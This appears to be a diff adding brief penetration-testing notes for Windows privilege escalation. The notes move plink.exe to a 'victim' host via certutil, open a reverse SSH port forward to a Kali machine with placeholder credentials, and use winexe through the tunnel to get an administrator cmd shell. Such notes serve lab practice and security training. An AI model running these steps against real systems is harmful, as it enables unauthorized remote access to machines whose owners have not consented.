@@ -1,0 +1,26 @@
+
+Use the netstat commad to find the ports which are publicly available so that we can use port forward. 
+
+PLink is a command line interface for puTTY back end. 
+
+Download the plink.exe to the kali linux and then transfer it to victim machine using certutil 
+
+restart the ssh server on kali machine 
+
+Now to forward the port run this command on windows machine 
+
+plink.exe -l <username> -pw <password> -R <localport>:127.0.0.1<remoteport> <remoteIP> 
+
+we are forwarding the only internal port that are available for us 
+
+root@kali:~# this pompt us back 
+
+Now we will use a tool called winexe 
+
+Winexe is a linux based application which eill allow us to execute commands on a windows system. 
+
+root@kali:~# winexe -U <username_of_administrator_of_Windows_machine>%<password> //127.0.0.1 "cmd.exe"
+
+run this command 2/3 times until we not get a cmd shell 
+
+ 
